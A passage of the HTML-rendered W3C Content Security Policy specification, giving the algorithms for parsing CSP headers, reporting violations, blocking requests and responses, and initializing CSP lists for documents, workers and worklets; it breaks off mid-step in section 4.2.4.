      <p>Let <var>policies</var> be the result of <a data-link-type="abstract-op" href="#abstract-opdef-parse-a-serialized-csp-list" id="ref-for-abstract-opdef-parse-a-serialized-csp-list">parsing</a> the result of <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#extract-header-list-values" id="ref-for-extract-header-list-values">extracting header list values</a> given <code>Content-Security-Policy</code> and <var>response</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response-header-list" id="ref-for-concept-response-header-list②">header list</a>, with a <a data-link-type="dfn" href="#policy-source" id="ref-for-policy-source⑤">source</a> of "<code>header</code>", and a <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition⑤">disposition</a> of "<code>enforce</code>".</p>
     <li data-md>
      <p>Append to <var>policies</var> the result of <a data-link-type="abstract-op" href="#abstract-opdef-parse-a-serialized-csp-list" id="ref-for-abstract-opdef-parse-a-serialized-csp-list①">parsing</a> the result of <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#extract-header-list-values" id="ref-for-extract-header-list-values①">extracting header list values</a> given <code>Content-Security-Policy-Report-Only</code> and <var>response</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response-header-list" id="ref-for-concept-response-header-list③">header list</a>, with a <a data-link-type="dfn" href="#policy-source" id="ref-for-policy-source⑥">source</a> of "<code>header</code>", and a <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition⑥">disposition</a> of "<code>report</code>".</p>
     <li data-md>
      <p>For each <var>policy</var> in <var>policies</var>:</p>
      <ol>
       <li data-md>
        <p>Set <var>policy</var>’s <a data-link-type="dfn" href="#policy-self-origin" id="ref-for-policy-self-origin">self-origin</a> to <var>response</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response-url" id="ref-for-concept-response-url">url</a>'s <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-origin" id="ref-for-concept-url-origin">origin</a>.</p>
       <li data-md>
        <p>Insert <var>policy</var> into <var>response</var>’s <a data-link-type="dfn">CSP list</a>.</p>
      </ol>
    </ol>
    <h4 class="heading settled dfn-paneled algorithm" data-algorithm="Report Content Security Policy violations for request" data-dfn-type="dfn" data-export data-level="4.1.2" data-lt="Report Content Security Policy violations for request" id="report-for-request"><span class="secno">4.1.2. </span><span class="content"> Report Content Security Policy violations for <var>request</var> </span><a class="self-link" href="#report-for-request" id="ref-for-report-for-request"></a></h4>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑨">request</a> (<var>request</var>), this algorithm reports violations based
  on <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-client" id="ref-for-concept-request-client①">client</a>’s "report only" policies.</p>
    <ol>
     <li data-md>
      <p>Let <var>CSP list</var> be <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-client" id="ref-for-concept-request-client②">client</a>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global" id="ref-for-concept-settings-object-global①">global object</a>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list①">CSP list</a>.</p>
     <li data-md>
      <p>For each <var>policy</var> in <var>CSP list</var>:</p>
      <ol>
       <li data-md>
        <p>If <var>policy</var>’s <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition⑦">disposition</a> is "<code>enforce</code>",
  then skip to the next <var>policy</var>.</p>
       <li data-md>
        <p>Let <var>violates</var> be the result of executing <a href="#does-request-violate-policy">§ 6.6.2.1 Does request violate policy?</a> on <var>request</var> and <var>policy</var>.</p>
       <li data-md>
        <p>If <var>violates</var> is not "<code>Does Not Violate</code>", then execute <a href="#report-violation">§ 5.3 Report a violation</a> on the result of executing <a href="#create-violation-for-request">§ 2.4.2 Create a violation object for request, and policy.</a> on <var>request</var>, and <var>policy</var>.</p>
      </ol>
    </ol>
    <h4 class="heading settled dfn-paneled algorithm" data-algorithm="Should request be blocked by Content Security Policy?" data-dfn-type="dfn" data-export data-level="4.1.3" data-lt="Should request be blocked by Content Security Policy?" id="should-block-request"><span class="secno">4.1.3. </span><span class="content"> Should <var>request</var> be blocked by Content Security Policy? </span><a class="self-link" href="#should-block-request" id="ref-for-should-block-request②"></a></h4>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request①⓪">request</a> (<var>request</var>), this algorithm returns <code>Blocked</code> or <code>Allowed</code> and reports violations based on <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-client" id="ref-for-concept-request-client③">client</a>’s Content Security Policy.</p>
    <ol>
     <li data-md>
      <p>Let <var>CSP list</var> be <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-client" id="ref-for-concept-request-client④">client</a>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global" id="ref-for-concept-settings-object-global②">global object</a>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list②">CSP list</a>.</p>
     <li data-md>
      <p>Let <var>result</var> be "<code>Allowed</code>".</p>
     <li data-md>
      <p>For each <var>policy</var> in <var>CSP list</var>:</p>
      <ol>
       <li data-md>
        <p>If <var>policy</var>’s <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition⑧">disposition</a> is "<code>report</code>",
  then skip to the next <var>policy</var>.</p>
       <li data-md>
        <p>Let <var>violates</var> be the result of executing <a href="#does-request-violate-policy">§ 6.6.2.1 Does request violate policy?</a> on <var>request</var> and <var>policy</var>.</p>
       <li data-md>
        <p>If <var>violates</var> is not "<code>Does Not Violate</code>", then:</p>
        <ol>
         <li data-md>
          <p>Execute <a href="#report-violation">§ 5.3 Report a violation</a> on the result of executing <a href="#create-violation-for-request">§ 2.4.2 Create a violation object for request, and policy.</a> on <var>request</var>, and <var>policy</var>.</p>
         <li data-md>
          <p>Set <var>result</var> to "<code>Blocked</code>".</p>
        </ol>
      </ol>
     <li data-md>
      <p>Return <var>result</var>.</p>
    </ol>
    <h4 class="heading settled dfn-paneled algorithm" data-algorithm="Should response to request be blocked by Content Security Policy?" data-dfn-type="dfn" data-export data-level="4.1.4" data-lt="Should response to request be blocked by Content Security Policy?" id="should-block-response"><span class="secno">4.1.4. </span><span class="content"> Should <var>response</var> to <var>request</var> be blocked by Content Security Policy? </span><a class="self-link" href="#should-block-response" id="ref-for-should-block-response③"></a></h4>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①②">response</a> (<var>response</var>) and a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request①①">request</a> (<var>request</var>), this algorithm returns <code>Blocked</code> or <code>Allowed</code>, and reports violations based on <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-client" id="ref-for-concept-request-client⑤">client</a>’s Content Security Policy.</p>
    <ol>
     <li data-md>
      <p>Let <var>CSP list</var> be <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-client" id="ref-for-concept-request-client⑥">client</a>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global" id="ref-for-concept-settings-object-global③">global object</a>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list③">CSP list</a>.</p>
     <li data-md>
      <p>Let <var>result</var> be "<code>Allowed</code>".</p>
     <li data-md>
      <p>For each <var>policy</var> in <var>CSP list</var>:</p>
      <ol>
       <li data-md>
        <p>For each <var>directive</var> in <var>policy</var>:</p>
        <ol>
         <li data-md>
          <p>If the result of executing <var>directive</var>’s <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check①">post-request check</a> is "<code>Blocked</code>", then:</p>
          <ol>
           <li data-md>
            <p>Execute <a href="#report-violation">§ 5.3 Report a violation</a> on the result of executing <a href="#create-violation-for-request">§ 2.4.2 Create a violation object for request, and policy.</a> on <var>request</var>, and <var>policy</var>.</p>
           <li data-md>
            <p>If <var>policy</var>’s <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition⑨">disposition</a> is "<code>enforce</code>",
  then set <var>result</var> to "<code>Blocked</code>".</p>
          </ol>
        </ol>
      </ol>
      <p class="note" role="note"><span class="marker">Note:</span> This portion of the check verifies that the page can load the
  response. That is, that a Service Worker hasn’t substituted a file which
  would violate the page’s CSP.</p>
     <li data-md>
      <p>For each <var>policy</var> in <var>response</var>’s <a data-link-type="dfn">CSP list</a>:</p>
      <ol>
       <li data-md>
        <p>For each <var>directive</var> in <var>policy</var>:</p>
        <ol>
         <li data-md>
          <p>If the result of executing <var>directive</var>’s <a data-link-type="dfn" href="#directive-response-check" id="ref-for-directive-response-check①">response check</a> on <var>request</var>, <var>response</var>,
  and <var>policy</var> is "<code>Blocked</code>", then:</p>
          <ol>
           <li data-md>
            <p>Execute <a href="#report-violation">§ 5.3 Report a violation</a> on the result of executing <a href="#create-violation-for-request">§ 2.4.2 Create a violation object for request, and policy.</a> on <var>request</var>, and <var>policy</var>.</p>
           <li data-md>
            <p>If <var>policy</var>’s <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition①⓪">disposition</a> is "<code>enforce</code>",
  then set <var>result</var> to "<code>Blocked</code>".</p>
          </ol>
        </ol>
      </ol>
      <p class="note" role="note"><span class="marker">Note:</span> This portion of the check allows policies delivered with the
  response to determine whether the response is allowed to be delivered.</p>
     <li data-md>
      <p>Return <var>result</var>.</p>
    </ol>
    <h3 class="heading settled" data-level="4.2" id="html-integration"><span class="secno">4.2. </span><span class="content"> Integration with HTML </span><a class="self-link" href="#html-integration"></a></h3>
    <ol>
     <li data-md>
      <p>The <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document④">Document</a></code>, <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope" id="ref-for-workerglobalscope①">WorkerGlobalScope</a></code>, and <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope" id="ref-for-workletglobalscope①">WorkletGlobalScope</a></code> objects have a <code>CSP list</code>, which holds all the <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object②③">policy</a> objects which are
  active for a given context. This list is empty unless otherwise specified,
  and is populated via the <a href="#initialize-global-object-csp" id="ref-for-initialize-global-object-csp①">§ 4.2.2 Initialize a global object’s CSP list</a> and <a href="#initialize-document-csp" id="ref-for-initialize-document-csp③">§ 4.2.1 Initialize a Document’s CSP list</a> algorithms.</p>
     <li data-md>
      <p>A <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object⑦">global object</a>’s <dfn class="dfn-paneled" data-dfn-for="global object" data-dfn-type="dfn" data-noexport id="global-object-csp-list">CSP list</dfn> is the result of executing <a href="#get-csp-of-object">§ 4.2.3 Retrieve the CSP list of an object</a> with the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object⑧">global object</a> as the <code>object</code>.</p>
     <li data-md>
      <p>A <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object②④">policy</a> is <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="enforced">enforced</dfn> or <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="monitored">monitored</dfn> for a <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object⑨">global object</a> by inserting it into the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object①⓪">global object</a>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list④">CSP list</a>.</p>
     <li data-md>
      <p><a href="#initialize-global-object-csp" id="ref-for-initialize-global-object-csp②">§ 4.2.2 Initialize a global object’s CSP list</a> is called during the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/workers.html#run-a-worker" id="ref-for-run-a-worker">run a worker</a> algorithm in order to bind a set of <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object②⑤">policy</a> objects associated
  with a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①③">response</a> <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope" id="ref-for-workerglobalscope②">WorkerGlobalScope</a></code> or <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope" id="ref-for-workletglobalscope②">WorkletGlobalScope</a></code>.</p>
     <li data-md>
      <p><a href="#initialize-document-csp" id="ref-for-initialize-document-csp④">§ 4.2.1 Initialize a Document’s CSP list</a> is called during the <a data-link-type="dfn" href="https://html.spec.whatwg.org/#initialise-the-document-object" id="ref-for-initialise-the-document-object">create and initialize a
  new <code>Document</code> object</a> algorithm in order to bind a set of <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object②⑥">policy</a> objects associated with a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①④">response</a> to a newly created <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document⑤">Document</a></code>.</p>
     <li data-md>
      <p><a href="#should-block-inline" id="ref-for-should-block-inline①">§ 4.2.4 Should element’s inline type behavior be blocked by Content Security Policy?</a> is called during the <a data-link-type="dfn">prepare a script</a> and <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/semantics.html#update-a-style-block" id="ref-for-update-a-style-block">update a <code>style</code> block</a> algorithms in order to determine whether or
  not an inline script or style block is allowed to execute/render.</p>
     <li data-md>
      <p><a href="#should-block-inline" id="ref-for-should-block-inline②">§ 4.2.4 Should element’s inline type behavior be blocked by Content Security Policy?</a> is called during handling of inline event
  handlers (like <code>onclick</code>) and inline <code>style</code> attributes in order to
  determine whether or not they ought to be allowed to execute/render.</p>
     <li data-md>
      <p><a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object②⑦">policy</a> is <a data-link-type="dfn" href="#enforced" id="ref-for-enforced①">enforced</a> during processing of the <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#meta" id="ref-for-meta⑨">meta</a></code> element’s <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv" id="ref-for-attr-meta-http-equiv②">http-equiv</a></code>.</p>
     <li data-md>
      <p>A <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document⑥">Document</a></code>'s <dfn class="dfn-paneled" data-dfn-type="dfn" data-noexport id="embedding-document">embedding document</dfn> is the <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document⑦">Document</a></code>'s <a data-link-type="dfn" href="https://html.spec.whatwg.org/#browsing-context" id="ref-for-browsing-context①">browsing context</a>’s <a data-link-type="dfn">container document</a>.</p>
     <li data-md>
      <p>HTML populates each <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request①②">request</a>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-nonce-metadata" id="ref-for-concept-request-nonce-metadata">cryptographic nonce
  metadata</a> and <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-parser-metadata" id="ref-for-concept-request-parser-metadata">parser metadata</a> with relevant data from the
  elements responsible for resource loading.</p>
      <p class="issue" id="issue-5599665e"><a class="self-link" href="#issue-5599665e"></a> Stylesheet loading is not yet integrated with
  Fetch in WHATWG’s HTML. <a href="https://github.com/whatwg/html/issues/968">[Issue #whatwg/html#968]</a></p>
     <li data-md>
      <p><a href="#allow-base-for-document" id="ref-for-allow-base-for-document">§ 6.2.1.1 Is base allowed for document?</a> is called during <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-base-element" id="ref-for-the-base-element">base</a></code>'s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/semantics.html#set-the-frozen-base-url" id="ref-for-set-the-frozen-base-url">set the frozen
  base URL</a> algorithm to ensure that the <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/semantics.html#attr-base-href" id="ref-for-attr-base-href">href</a></code> attribute’s value
  is valid.</p>
     <li data-md>
      <p><a href="#should-block-navigation-request" id="ref-for-should-block-navigation-request②">§ 4.2.5 Should navigation request of type be blocked
    by Content Security Policy?</a> is called during the <a data-link-type="dfn">process a
  navigate fetch</a> algorithm, and <a href="#should-block-navigation-response" id="ref-for-should-block-navigation-response①">§ 4.2.6 Should navigation response to navigation request of type
    in target be blocked by Content Security Policy?</a> is called during the <a data-link-type="dfn">process a navigate response</a> algorithm to
  apply directive’s navigation checks, as well as inline checks for
  navigations to <code>javascript:</code> URLs.</p>
    </ol>
    <h4 class="heading settled dfn-paneled algorithm" data-algorithm="Initialize a Document’s CSP list" data-dfn-type="dfn" data-export data-level="4.2.1" data-lt="Initialize a Document’s CSP list" id="initialize-document-csp"><span class="secno">4.2.1. </span><span class="content"> Initialize a <code>Document</code>’s <code>CSP list</code> </span><a class="self-link" href="#initialize-document-csp" id="ref-for-initialize-document-csp⑤"></a></h4>
    <p>Given a <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document⑧">Document</a></code> (<var>document</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①⑤">response</a> (<var>response</var>), and a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request①③">request</a> or <code>null</code> (<var>request</var>) the user agent performs the following
  steps in order to initialize <var>document</var>’s <a data-link-type="dfn">CSP list</a>:</p>
    <ol>
     <li data-md>
      <p>If <var>request</var> is not <code>null</code> and <var>response</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response-url" id="ref-for-concept-response-url①">url</a>’s <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-scheme" id="ref-for-concept-url-scheme">scheme</a> is either a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#local-scheme" id="ref-for-local-scheme②">local scheme</a> or <code>javascript</code>:</p>
      <ol>
       <li data-md>
        <p>For each <var>policy</var> in <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-client" id="ref-for-concept-request-client⑦">client</a>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global" id="ref-for-concept-settings-object-global④">global object</a>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list⑤">CSP list</a>:</p>
        <ol>
         <li data-md>
          <p>Insert a copy of <var>policy</var> into <var>document</var>’s <a data-link-type="dfn">CSP list</a>.</p>
        </ol>
      </ol>
      <p class="note" role="note"><span class="marker">Note:</span> For <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#an-iframe-srcdoc-document" id="ref-for-an-iframe-srcdoc-document">iframe srcdoc Documents</a>, <var>request</var> will be <code>null</code>, but <var>response</var> will contain a copy of the <a data-link-type="dfn" href="#embedding-document" id="ref-for-embedding-document">embedding document</a>’s <a data-link-type="dfn">CSP list</a> in its <a data-link-type="dfn">CSP list</a>, as specified in <a data-link-type="dfn" href="https://html.spec.whatwg.org/#process-the-iframe-attributes" id="ref-for-process-the-iframe-attributes">process the iframe attributes</a>.
  As such <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#an-iframe-srcdoc-document" id="ref-for-an-iframe-srcdoc-document①">iframe srcdoc Documents</a> inherit their <a data-link-type="dfn" href="#embedding-document" id="ref-for-embedding-document①">embedding document</a>’s <a data-link-type="dfn">CSP list</a>.</p>
      <p class="note" role="note"><span class="marker">Note:</span> Since <a data-link-type="dfn" href="#policy-self-origin" id="ref-for-policy-self-origin①">self-origin</a> is also copied, any <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self③"><code>'self'</code></a> checks will be using the <a data-link-type="dfn">source browsing context</a>’s origin. This is
  done for the purpose of making <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self④"><code>'self'</code></a> make sense in documents
  with <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-opaque" id="ref-for-concept-origin-opaque①">opaque origins</a>. The <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self⑤"><code>'self'</code></a> keyword is used
  in the <a href="#match-url-to-source-expression">§ 6.6.2.6 Does url match expression in origin with redirect count?</a> algorithm.</p>
      <p class="note" role="note"><span class="marker">Note:</span> We do all this to ensure that a page cannot bypass its <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object②⑧">policy</a> by embedding a frame or popping up a new window containing content it
  controls (<code>blob:</code> resources, or <code>document.write()</code>).</p>
     <li data-md>
      <p>For each <var>policy</var> in <var>response</var>’s <a data-link-type="dfn">CSP list</a>, insert <var>policy</var> into <var>document</var>’s <a data-link-type="dfn">CSP list</a>.</p>
     <li data-md>
      <p>For each <var>policy</var> in <var>document</var>’s <a data-link-type="dfn">CSP list</a>:</p>
      <ol>
       <li data-md>
        <p>For each <var>directive</var> in <var>policy</var>:</p>
        <ol>
         <li data-md>
          <p>Execute <var>directive</var>’s <a data-link-type="dfn" href="#directive-initialization" id="ref-for-directive-initialization">initialization</a> algorithm on <var>document</var> and <var>response</var>.</p>
        </ol>
      </ol>
    </ol>
    <h4 class="heading settled dfn-paneled algorithm" data-algorithm="Initialize a global object’s CSP list" data-dfn-type="dfn" data-export data-level="4.2.2" data-lt="Initialize a global object’s CSP list" id="initialize-global-object-csp"><span class="secno">4.2.2. </span><span class="content"> Initialize a global object’s <code>CSP list</code> </span><a class="self-link" href="#initialize-global-object-csp" id="ref-for-initialize-global-object-csp③"></a></h4>
    <p>Given a <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object①①">global object</a> (<var>global</var>), and a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①⑥">response</a> (<var>response</var>), the user agent performs the following steps in order
  to initialize <var>global</var>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list⑥">CSP list</a>:</p>
    <ol>
     <li data-md>
      <p>If <var>response</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response-url" id="ref-for-concept-response-url②">url</a>’s <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-scheme" id="ref-for-concept-url-scheme①">scheme</a> is a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#local-scheme" id="ref-for-local-scheme③">local scheme</a>, or if <var>global</var> is a <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#dedicatedworkerglobalscope" id="ref-for-dedicatedworkerglobalscope">DedicatedWorkerGlobalScope</a></code>:</p>
      <ol>
       <li data-md>
        <p>Let <var>owners</var> be an empty list.</p>
       <li data-md>
        <p>Add each of the items in <var>global</var>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/#concept-WorkerGlobalScope-owner-set" id="ref-for-concept-WorkerGlobalScope-owner-set">owner set</a> to <var>owners</var>.</p>
       <li data-md>
        <p>For each <var>owner</var> in <var>owners</var>:</p>
        <ol>
         <li data-md>
          <p>For each <var>policy</var> in <var>owner</var>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list⑦">CSP list</a>:</p>
          <ol>
           <li data-md>
            <p>Insert a copy of <var>policy</var> into <var>global</var>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list⑧">CSP list</a>.</p>
          </ol>
        </ol>
      </ol>
      <p class="note" role="note"><span class="marker">Note:</span> <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#local-scheme" id="ref-for-local-scheme④">local scheme</a> includes <code>about:</code>, and this algorithm will
  therefore copy the <a data-link-type="dfn" href="#embedding-document" id="ref-for-embedding-document②">embedding document</a>’s policies for <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#an-iframe-srcdoc-document" id="ref-for-an-iframe-srcdoc-document②">an iframe <code>srcdoc</code> <code>Document</code></a>.</p>
     <li data-md>
      <p>If <var>global</var> is a <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#sharedworkerglobalscope" id="ref-for-sharedworkerglobalscope">SharedWorkerGlobalScope</a></code> or <code class="idl"><a data-link-type="idl" href="https://www.w3.org/TR/service-workers/#serviceworkerglobalscope" id="ref-for-serviceworkerglobalscope">ServiceWorkerGlobalScope</a></code>:</p>
      <ol>
       <li data-md>
        <p>For each <var>policy</var> in <var>response</var>’s <a data-link-type="dfn">CSP list</a>, insert <var>policy</var> into <var>global</var>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list⑨">CSP list</a>.</p>
      </ol>
     <li data-md>
      <p>If <var>global</var> is a <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope" id="ref-for-workletglobalscope③">WorkletGlobalScope</a></code>:</p>
      <ol>
       <li data-md>
        <p>Let <var>owner</var> be <var>global</var>’s <a data-link-type="dfn">owner document</a>.</p>
       <li data-md>
        <p>For each <var>policy</var> in <var>owner</var>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list①⓪">CSP list</a>:</p>
        <ol>
         <li data-md>
          <p>Insert a copy of <var>policy</var> into <var>global</var>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list①①">CSP list</a>.</p>
        </ol>
      </ol>
    </ol>
    <h4 class="heading settled algorithm" data-algorithm="Retrieve the CSP list of an object" data-level="4.2.3" id="get-csp-of-object"><span class="secno">4.2.3. </span><span class="content"> Retrieve the <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list①②">CSP list</a> of an <var>object</var> </span><a class="self-link" href="#get-csp-of-object"></a></h4>
    <p>To obtain <var>object</var>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list①③">CSP list</a>:</p>
    <ol>
     <li data-md>
      <p>If <var>object</var> is a <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document⑨">Document</a></code> return <var>object</var>’s <a data-link-type="dfn">CSP list</a>.</p>
     <li data-md>
      <p>If <var>object</var> is a <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#window" id="ref-for-window①">Window</a></code> return <var>object</var>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#concept-document-window" id="ref-for-concept-document-window">associated <code>Document</code></a>’s <a data-link-type="dfn">CSP list</a>.</p>
     <li data-md>
      <p>If <var>object</var> is a <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope" id="ref-for-workerglobalscope③">WorkerGlobalScope</a></code>, return <var>object</var>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list①④">CSP list</a>.</p>
     <li data-md>
      <p>If <var>object</var> is a <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope" id="ref-for-workletglobalscope④">WorkletGlobalScope</a></code>, return <var>object</var>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list①⑤">CSP list</a>.</p>
     <li data-md>
      <p>Return <code>null</code>.</p>
    </ol>
    <h4 class="heading settled dfn-paneled algorithm" data-algorithm="Should element’s inline type behavior be blocked by Content Security Policy?" data-dfn-type="dfn" data-export data-level="4.2.4" data-lt="Should element’s inline type behavior be blocked by Content Security Policy?" id="should-block-inline"><span class="secno">4.2.4. </span><span class="content"> Should <var>element</var>’s inline <var>type</var> behavior be blocked by Content Security Policy? </span><a class="self-link" href="#should-block-inline" id="ref-for-should-block-inline③"></a></h4>
    <p>Given an <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element①">Element</a></code> (<var>element</var>), a string (<var>type</var>), and a string (<var>source</var>)
  this algorithm returns "<code>Allowed</code>" if the element is allowed to have inline
  definition of a particular type of behavior (script execution, style
  application, event handlers, etc.), and "<code>Blocked</code>" otherwise:</p>
    <p class="note" role="note"><span class="marker">Note:</span> The valid values for <var>type</var> are "<code>script</code>", "<code>script attribute</code>",
  "<code>style</code>", and "<code>style attribute</code>".</p>
    <ol class="algorithm">
     <li data-md>
      <p class="assertion">Assert: <var>element</var> is not <code>null</code>.</p>
     <li data-md>
      <p>Let <var>result</var> be "<code>Allowed</code>".</p>
     <li data-md>
      <p>For each <var>policy</var> in <var>element</var>’s <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①⓪">Document</a></code>'s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object" id="ref-for-global-object①②">global object</a>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list①⑥">CSP list</a>:</p>
      <ol>
       <li data-md>
        <p>For each <var>directive</var> in <var>policy</var>’s <a data-link-type="dfn" href="#policy-directive-set" id="ref-for-policy-directive-set⑥">directive set</a>:</p>
        <ol>
         <li data-md>
          <p>If <var>directive</var>’s <a data-link-type="dfn" href="#directive-inline-check" id="ref-for-directive-inline-check">inline check</a> returns
